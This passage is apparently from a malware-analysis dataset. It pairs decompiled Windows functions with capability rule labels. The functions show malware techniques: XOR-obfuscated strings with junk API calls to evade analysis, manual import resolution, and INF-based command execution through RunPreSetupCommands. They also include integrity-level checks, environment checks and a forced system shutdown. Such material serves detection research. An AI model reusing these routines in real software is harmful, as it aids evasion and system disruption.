        "decompiled_code": "\nuint __cdecl fcn.00406005(uint hModule, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t in_ECX;\n    uint32_t *puVar3;\n    int32_t iVar4;\n    \n    if ((arg_ch == 0) && (arg_ch = arg_10h,  arg_10h == 0)) {\n        uVar1 = 0xc000007b;\n    }\n    else {\n        puVar3 = in_ECX + arg_ch;\n        if (puVar3 == NULL) {\n            uVar1 = 0xc000007b;\n        }\n        else {\n            uVar2 = *puVar3;\n            if (uVar2 != 0) {\n                iVar4 = (in_ECX + arg_10h) - puVar3;\n                do {\n                    if (uVar2 < 0x80000000) {\n                        uVar2 = uVar2 + 2 + in_ECX;\n                    }\n                    else {\n                        uVar2 = uVar2 & 0xffff;\n                    }\n                    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(hModule, uVar2);\n                    *(iVar4 + puVar3) = uVar1;\n                    puVar3 = puVar3 + 1;\n                    uVar2 = *puVar3;\n                } while (uVar2 != 0);\n            }\n            uVar1 = 0;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 338
    },
    "0040606d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040606d(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint lpModuleName;\n    uint phModule;\n    \n    iVar2 = *0x41dd7c;\n    iVar4 = *(*(*0x41dd7c + 0x3c) + 0x80 + *0x41dd7c);\n    if (iVar4 == 0) {\n        uVar3 = 0xc000000d;\n    }\n    else {\n        puVar6 = iVar4 + *0x41dd7c;\n        if (puVar6 == NULL) {\n            uVar3 = 0xc000000d;\n        }\n        else {\n            iVar4 = puVar6[3];\n            while (iVar4 != 0) {\n                if (iVar4 + iVar2 != 0) {\n                    iVar4 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(iVar4 + iVar2);\n                    if (iVar4 == 0) break;\n                    lpModuleName._0_1_ = 0;\n                    iVar5 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(iVar4, &lpModuleName, 0x104);\n                    if (iVar5 != 0) {\n                        (*_sym.imp.KERNEL32.dll_GetModuleHandleExA)(1, &lpModuleName, &phModule);\n                    }\n                    iVar4 = fcn.00406005(iVar4, *puVar6, puVar6[4]);\n                    if (iVar4 != 0) break;\n                }\n                piVar1 = puVar6 + 8;\n                puVar6 = puVar6 + 5;\n                iVar4 = *piVar1;\n            }\n            uVar3 = 0;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 427
    },
    "00408904": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00408904(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t arg_8h_00;\n    uchar *puVar5;\n    uint *puVar6;\n    uchar auStack48 [4];\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    \n    puVar5 = auStack48;\n    for (iVar2 = 0x10; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    iVar4 = 0;\n    arg_8h_00 = 0;\n    uStack40 = arg_8h;\n    iVar2 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x43a, 0, arg_8h);\n    if (iVar2 != 0) {\n        puVar6 = &uStack44;\n        for (iVar3 = 0x18; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar6 = 0;\n            puVar6 = puVar6 + 1;\n        }\n        uStack28 = 0x4400;\n        uStack44 = 0x413010;\n        uStack40 = 0;\n        uStack24 = 0x6200;\n        uStack36 = 0x417410;\n        uStack32 = 0;\n        (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n        iVar3 = fcn.004089dc();\n        if (iVar3 != 0) {\n            iVar3 = fcn.004089dc();\n            arg_8h_00 = -(iVar3 != 0) & 0x10;\n        }\n        do {\n            iVar3 = fcn.00409753(arg_8h_00);\n            if (iVar3 == 0) break;\n            (*_sym.imp.KERNEL32.dll_Sleep)(0x32);\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 0x14);\n        pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n        (*pcVar1)(iVar2);\n    }\n    return 0;\n}\n",
        "token_count": 544
    },
    "0040b687": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040b687(uint param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *puVar3;\n    uint8_t *puVar4;\n    uint32_t *puVar5;\n    int32_t iVar6;\n    uint TokenHandle;\n    uint TokenInformationLength;\n    \n    iVar6 = 0;\n    TokenHandle = param_1;\n    TokenInformationLength = param_1;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(param_1, 8, &TokenHandle);\n    if (iVar1 != 0) {\n        iVar6 = 0;\n        iVar1 = (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(TokenHandle, 0x19, 0, 0, &TokenInformationLength);\n        if ((iVar1 == 0) && (iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar1 == 0x7a)) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, TokenInformationLength);\n            puVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            if (puVar3 != NULL) {\n                iVar1 = (*_sym.imp.ADVAPI32.dll_GetTokenInformation)\n                                  (TokenHandle, 0x19, puVar3, TokenInformationLength, &TokenInformationLength);\n                if ((((iVar1 != 0) &&\n                     (puVar4 = (*_sym.imp.ADVAPI32.dll_GetSidSubAuthorityCount)(*puVar3),  puVar4 != NULL)) &&\n                    (*puVar4 != 0)) &&\n                   (puVar5 = (*_sym.imp.ADVAPI32.dll_GetSidSubAuthority)(*puVar3, *puVar4 - 1),  puVar5 != NULL)) {\n                    if (*puVar5 < 0x2000) {\n                        iVar6 = 1;\n                    }\n                    else {\n                        iVar6 = 3 - (*puVar5 < 0x3000);\n                    }\n                }\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar3);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            }\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n    }\n    return iVar6;\n}\n",
        "token_count": 520
    },
    "0040caaf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040caaf(uint param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint var_10h;\n    uint var_ch;\n    uint hModule;\n    uint var_4h;\n    \n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    if (iVar3 != 0) {\n        iVar6 = 0x104;\n        do {\n            iVar4 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(param_1, iVar3, iVar6);\n            pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            if ((iVar4 == 0) || (iVar6 != iVar4)) break;\n            iVar6 = iVar6 + 0x104;\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            uVar2 = (*pcVar1)(8, iVar6 * 2);\n            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        } while (iVar3 != 0);\n        if (iVar3 != 0) {\n            if (iVar4 != 0) {\n                *param_2 = iVar3;\n                return 0;\n            }\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n            return uVar2;\n        }\n    }\n    return 8;\n}\n",
        "token_count": 424
    },
    "0040cfb2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint16_t * __fastcall fcn.0040cfb2(int16_t *param_1)\n\n{\n    int16_t iVar1;\n    \n    iVar1 = *param_1;\n    if (iVar1 != 0x3d) {\n        do {\n            if (iVar1 == 0) break;\n            param_1 = param_1 + 1;\n            iVar1 = *param_1;\n        } while (iVar1 != 0x3d);\n        if (*param_1 != 0x3d) {\n            return NULL;\n        }\n    }\n    return param_1;\n}\n",
        "token_count": 131
    },
    "0040cfd8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint16_t * __cdecl fcn.0040cfd8(int16_t **arg_8h)\n\n{\n    int16_t iVar1;\n    int16_t iVar2;\n    int16_t *piVar3;\n    int16_t *piVar4;\n    int16_t *in_ECX;\n    int16_t *piVar5;\n    int16_t *piVar6;\n    \n    if (in_ECX == NULL) {\n        in_ECX = *arg_8h;\n        if (in_ECX == NULL) {\n            return in_ECX;\n        }\n    }\n    do {\n        piVar3 = in_ECX;\n        piVar5 = 0x4117ac;\n        do {\n            iVar1 = *piVar5;\n            piVar5 = piVar5 + 1;\n            if (iVar1 == 0) {\n                piVar5 = piVar3 + 1;\n                if (*piVar3 == 0) {\n                    *arg_8h = NULL;\n                    return NULL;\n                }\n                do {\n                    piVar4 = piVar5;\n                    iVar1 = *piVar4;\n                    piVar6 = 0x4117ac;\n                    do {\n                        iVar2 = *piVar6;\n                        piVar6 = piVar6 + 1;\n                        if (iVar2 == iVar1) {\n                            if (iVar1 != 0) {\n                                *piVar4 = 0;\n                            }\n                            piVar5 = NULL;\n                            if (iVar1 != 0) {\n                                piVar5 = piVar4 + 1;\n                            }\n                            *arg_8h = piVar5;\n                            return piVar3;\n                        }\n                        piVar5 = piVar4 + 1;\n                    } while (iVar2 != 0);\n                } while( true );\n            }\n            in_ECX = piVar3 + 1;\n        } while (*piVar3 != iVar1);\n    } while( true );\n}\n",
        "token_count": 420
    },
    "0040d04b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint16_t * __fastcall fcn.0040d04b(int16_t *param_1, int16_t param_2)\n\n{\n    int16_t *piVar1;\n    \n    piVar1 = NULL;\n    while( true ) {\n        if (*param_1 == param_2) {\n            piVar1 = param_1;\n        }\n        if (*param_1 == 0) break;\n        param_1 = param_1 + 1;\n    }\n    return piVar1;\n}\n",
        "token_count": 110
    },
    "0040e2b2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040e2b2(int32_t *arg_8h)\n\n{\n    char *pcVar1;\n    char cVar2;\n    int16_t iVar3;\n    code *pcVar4;\n    int16_t *piVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint uVar8;\n    int16_t *in_ECX;\n    int16_t *piVar9;\n    char **in_EDX;\n    int16_t *piVar10;\n    uint uVar11;\n    int16_t *piVar12;\n    char *pcVar13;\n    uint var_ch;\n    uint var_8h;\n    uint lpWideCharStr;\n    \n    uVar11 = 0;\n    piVar5 = fcn.0040d1c1();\n    pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (piVar5 != NULL) {\n        piVar10 = piVar5;\n        do {\n            iVar3 = *piVar10;\n            piVar10 = piVar10 + 1;\n        } while (iVar3 != 0);\n        piVar9 = piVar5;\n        do {\n            iVar3 = *piVar9;\n            piVar9 = piVar9 + 1;\n        } while (iVar3 != 0);\n        piVar12 = in_ECX;\n        do {\n            iVar3 = *piVar12;\n            piVar12 = piVar12 + 1;\n        } while (iVar3 != 0);\n        uVar11 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)\n                           (8, ((piVar12 - (in_ECX + 1) >> 1) + (piVar9 - (piVar5 + 1) >> 1) +\n                               (piVar10 - (piVar5 + 1) >> 1)) * 2 + 0x140);\n        iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar11);\n        (*_sym.imp.USER32.dll_wsprintfW)\n                  (iVar6, \n                   L\"[Version]\\r\\nsignature = \\\"$CHICAGO$\\\"\\r\\nAdvancedINF = 2.5, \\\"You need a new version of advpack.dll\\\"\\r\\n\\r\\n[DefaultInstall]\\r\\nRunPreSetupCommands = %s:2\\r\\n\\r\\n[%s]\\r\\n%s\\r\\n\"\n                   , piVar5, piVar5, in_ECX);\n        if (iVar6 == 0) {\n            pcVar13 = NULL;\n        }\n        else {\n            iVar7 = (*_sym.imp.KERNEL32.dll_lstrlenW)(iVar6);\n            iVar7 = iVar7 * 2 + 2;\n            uVar11 = (*pcVar4)(8, iVar7);\n            pcVar13 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar11);\n            *pcVar13 = '\\0';\n            (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, iVar6, 0xffffffff, pcVar13, iVar7, 0, 0);\n        }\n        pcVar1 = pcVar13 + 1;\n        *in_EDX = pcVar13;\n        do {\n            cVar2 = *pcVar13;\n            pcVar13 = pcVar13 + 1;\n        } while (cVar2 != '\\0');\n        *arg_8h = pcVar13 - pcVar1;\n        uVar11 = 1;\n        uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar5);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n    }\n    return uVar11;\n}\n",
        "token_count": 809
    },
    "0040f4e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040f4e0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uchar *puVar4;\n    uint var_410h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_10h = param_1;\n    uVar2 = 0;\n    var_8h = 0;\n    var_1h._0_1_ = 0x22;\n    var_ch = 0;\n    do {\n        if (0x3ff < uVar2) {\n            iVar1 = var_8h + uVar2;\n            puVar3 = &var_410h;\n            puVar4 = var_8h + param_1;\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar4 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar4 = puVar4 + 1;\n            }\n            uVar2 = 0;\n            var_8h = iVar1;\n            param_1 = var_10h;\n        }\n        *(&var_410h + uVar2) = *(var_ch + param_1) ^ var_1h;\n        uVar2 = uVar2 + 1;\n        var_1h._0_1_ = var_1h + (var_ch % 0x85) * '\\x03';\n        var_ch = var_ch + 1;\n    } while (var_ch < 0x184);\n    if (uVar2 != 0) {\n        puVar3 = &var_410h;\n        puVar4 = var_8h + param_1;\n        for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n            *puVar4 = *puVar3;\n            puVar3 = puVar3 + 1;\n            puVar4 = puVar4 + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 500
    },
    "004101d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.004101d4(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uchar *puVar4;\n    uint var_414h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_10h = param_1;\n    var_14h = param_2;\n    var_8h = 0;\n    uVar2 = 0;\n    var_1h._0_1_ = 0x22;\n    var_ch = 0;\n    if (0 < param_2) {\n        do {\n            if (0x3ff < uVar2) {\n                iVar1 = var_8h + uVar2;\n                puVar3 = &var_414h;\n                puVar4 = var_8h + param_1;\n                for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                    *puVar4 = *puVar3;\n                    puVar3 = puVar3 + 1;\n                    puVar4 = puVar4 + 1;\n                }\n                uVar2 = 0;\n                var_8h = iVar1;\n                param_1 = var_10h;\n                param_2 = var_14h;\n            }\n            *(&var_414h + uVar2) = *(var_ch + param_1) ^ var_1h;\n            uVar2 = uVar2 + 1;\n            var_1h._0_1_ = var_1h + (var_ch % 0x85) * '\\x03';\n            var_ch = var_ch + 1;\n        } while (var_ch < param_2);\n        if (uVar2 != 0) {\n            puVar3 = &var_414h;\n            puVar4 = var_8h + param_1;\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar4 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar4 = puVar4 + 1;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 545
    },
    "00404953": {
        "rules": [
            "create or open registry key",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00404953(uint param_1, uint param_2)\n\n{\n    uint32_t uVar1;\n    bool bVar2;\n    uint lpType;\n    uint lpcbData;\n    uint namelen;\n    \n    namelen = 0;\n    uVar1 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyA)(reloc.WS2_32.dll_bind, param_1, &namelen);\n    bVar2 = uVar1 == 0;\n    if (bVar2) {\n        lpType = 1;\n        lpcbData = 0x400;\n        (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(namelen, param_2, 0, &lpType, 0x41dde0, &lpcbData);\n        uVar1 = (*_sym.imp.ADVAPI32.dll_RegCloseKey)(namelen);\n    }\n    return uVar1 & 0xffffff00 | bVar2;\n}\n",
        "token_count": 216
    },
    "004041fd": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004041fd(uint param_1)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint lpBuffer;\n    uint var_8h;\n    int32_t lpNumberOfBytesRead;\n    \n    var_8h = param_1;\n    do {\n        *0x41db10 = 0;\n        iVar2 = (*_sym.imp.KERNEL32.dll_CreateFileW)(param_1, 0x80000000, 3, 0, 3, 0, 0);\n        if (iVar2 != 0) {\n            iVar3 = (*_sym.imp.KERNEL32.dll_ReadFile)(iVar2, &lpBuffer, 0x200, &lpNumberOfBytesRead, 0);\n            while ((iVar3 != 0 && (param_1 = var_8h,  lpNumberOfBytesRead != 0))) {\n                puVar4 = &lpBuffer;\n                iVar3 = lpNumberOfBytesRead;\n                do {\n                    uVar1 = *puVar4;\n                    puVar4 = puVar4 + 1;\n                    *0x41db10 = *0x41db10 >> 8 ^ *((uVar1 ^ *0x41db10 & 0xff) * 4 + 0x411390) ^ 0xd202ef8d;\n                    iVar3 = iVar3 + -1;\n                } while (iVar3 != 0);\n                iVar3 = (*_sym.imp.KERNEL32.dll_ReadFile)(iVar2, &lpBuffer, 0x200, &lpNumberOfBytesRead, 0);\n                param_1 = var_8h;\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n            iVar2 = fcn.0040a771(0x41db14);\n            if (iVar2 == 0) {\n                return;\n            }\n        }\n        (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n    } while( true );\n}\n",
        "token_count": 444
    },
    "00404b41": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nvoid fcn.00404b41(void)\n\n{\n    int32_t iVar1;\n    \n    while( true ) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n        if (iVar1 == 0) break;\n        (*_sym.imp.KERNEL32.dll_Sleep)();\n    }\n    return;\n}\n",
        "token_count": 70
    },
    "0040deca": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nuint fcn.0040deca(void)\n\n{\n    int32_t iVar1;\n    \n    while( true ) {\n        iVar1 = fcn.0040d8bf();\n        if (iVar1 != 0) break;\n        (*_sym.imp.KERNEL32.dll_Sleep)(5000);\n    }\n    fcn.0040d877();\n    return 0;\n}\n",
        "token_count": 82
    },
    "004083ac": {
        "rules": [
            "check process job object/8aaf725824be4e7b84101cffc1f879ea",
            "open process"
        ],
        "decompiled_code": "\nbool __fastcall fcn.004083ac(uint param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    \n    iVar4 = 0;\n    iVar1 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x400, 0, param_1);\n    if (iVar1 != 0) {\n        iVar2 = fcn.004086d7();\n        if (iVar2 != 0) {\n            iVar4 = fcn.00407abf();\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n    }\n    return iVar4 == 0;\n}\n",
        "token_count": 188
    },
    "00401ebc": {
        "rules": [
            "contain loop",
            "query environment variable"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00401ebc(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    uint lpString;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_18h = 0x33301d19;\n    var_14h = 0x3e0a1709;\n    var_10h = 0x160d3c;\n    var_ch._0_1_ = 0x51;\n    puVar5 = &lpString;\n    for (iVar4 = 0x104; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    var_20h = 0;\n    var_8h = 0x50516f7a;\n    var_4h._0_1_ = 0x62;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar6 = 0;\n    do {\n        iVar2 = (*_sym.imp.USER32.dll_CreatePopupMenu)();\n        if (iVar2 != 0xe8a29) {\n            var_1ch = 5;\n            *(iVar6 + iVar4) = *(&var_8h + iVar6 % 5) ^ (iVar6 + iVar4)[&var_18h - iVar4];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0xd);\n    iVar6 = (*_sym.imp.KERNEL32.dll_GetEnvironmentVariableA)(iVar4, &lpString, 0x104);\n    uVar1 = var_20h;\n    if (iVar6 != 0) {\n        (*_sym.imp.KERNEL32.dll_lstrlenA)(&lpString);\n        iVar6 = fcn.00402ff1();\n        if (iVar6 == -0x69b4c9f2) {\n            uVar1 = 1;\n        }\n    }\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    return uVar1;\n}\n",
        "token_count": 585
    },
    "004049af": {
        "rules": [
            "contain loop",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.004049af(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    code *pcVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    int32_t iVar11;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint32_t var_36h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    uchar var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    int32_t lpLibFileName;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_60h = 0xf01faf00;\n    var_5ch = 0x505600;\n    var_58h = 0x8002700;\n    var_54h = 0xc2900;\n    var_50h = 0x56900;\n    var_4ch = 0x3ff00;\n    var_48h = 0x1c4200;\n    var_44h = 0x163e00;\n    var_10h = 0;\n    var_28h = 0x26146314;\n    var_24h = 0x331d7222;\n    var_20h = var_20h & 0xff000000 | 0x461a18;\n    var_18h = 0x74573346;\n    var_14h._0_1_ = 0x76;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    var_4h = 5;\n    iVar11 = 0;\n    var_8h = &var_28h - iVar5;\n    lpLibFileName = iVar5;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetFocus)();\n        if (iVar6 != 0x15ded5) {\n            *(iVar11 + iVar5) = *(&var_18h + iVar11 % var_4h) ^ (iVar11 + iVar5)[var_8h];\n        }\n        iVar11 = iVar11 + 1;\n    } while (iVar11 < 0xb);\n    var_30h = 0x510b4c1e;\n    var_2ch = 0x35c3920;\n    var_28h = 0x5c180641;\n    var_24h = 0x25064013;\n    var_20h = 0xf540b4d;\n    var_1ch = 0x4b;\n    var_18h = 0x3562394b;\n    var_14h._0_1_ = 99;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x16);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar11 = 0;\n    var_8h = &var_30h - iVar5;\n    do {\n        iVar7 = (*_sym.imp.USER32.dll_GetMessageExtraInfo)();\n        iVar6 = lpLibFileName;\n        if (iVar7 != 0xe3a22d) {\n            *(iVar11 + iVar5) = *(&var_18h + iVar11 % var_4h) ^ (iVar11 + iVar5)[&var_30h - iVar5];\n        }\n        iVar11 = iVar11 + 1;\n    } while (iVar11 < 0x15);\n    uVar4 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar5);\n    pcVar8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar4);\n    uVar10 = var_10h;\n    if (pcVar8 == NULL) {\n        uVar10 = 0;\n    }\n    else {\n        (*pcVar8)(&var_40h);\n        uVar3 = var_36h;\n        uVar2 = var_36h & 0xffffff;\n        var_36h = uVar2 | uVar10 << 0x18;\n        uVar9 = 0;\n        uVar1 = uVar10 & 0xff;\n        do {\n            if ((uVar1 | (uVar3 & 0xff0000) >> 8 | (uVar3 & 0xff00) << 8 | uVar2 << 0x18) == (&var_60h)[uVar9]) {\n                uVar10 = 1;\n            }\n            uVar9 = uVar9 + 1;\n        } while (uVar9 < 8);\n    }\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n    pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n    (*pcVar8)(uVar4);\n    return uVar10;\n}\n",
        "token_count": 1260
    },
    "0040d315": {
        "rules": [
            "contain loop",
            "shutdown system",
            "modify access privileges"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040d315(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint NewState;\n    uint lpLuid;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint TokenHandle;\n    uint var_4h;\n    \n    var_34h = 0xa64172b;\n    var_30h = 0x58160c36;\n    var_2ch = 0x282d15;\n    var_28h = 0x142a145e;\n    var_24h = 0x43075017;\n    var_10h = 0x62377278;\n    var_ch._0_1_ = 0x43;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar6 = 0;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n        if (iVar5 != 0xbaaa) {\n            var_4h = 5;\n            *(iVar6 + iVar4) = *(&var_10h + iVar6 % 5) ^ (iVar6 + iVar4)[&var_34h - iVar4];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x14);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0x28, &TokenHandle);\n    (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar3);\n    (*_sym.imp.ADVAPI32.dll_LookupPrivilegeValueA)(0, iVar4, &lpLuid);\n    NewState = 1;\n    var_14h = 2;\n    (*_sym.imp.ADVAPI32.dll_AdjustTokenPrivileges)(TokenHandle, 0, &NewState, 0, 0, 0);\n    pcVar2 = _sym.imp.USER32.dll_ExitWindowsEx;\n    iVar6 = (*_sym.imp.USER32.dll_ExitWindowsEx)(6, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar6 == 0) {\n        (*pcVar2)(4, 0);\n    }\n    uVar3 = (*pcVar1)(0, iVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    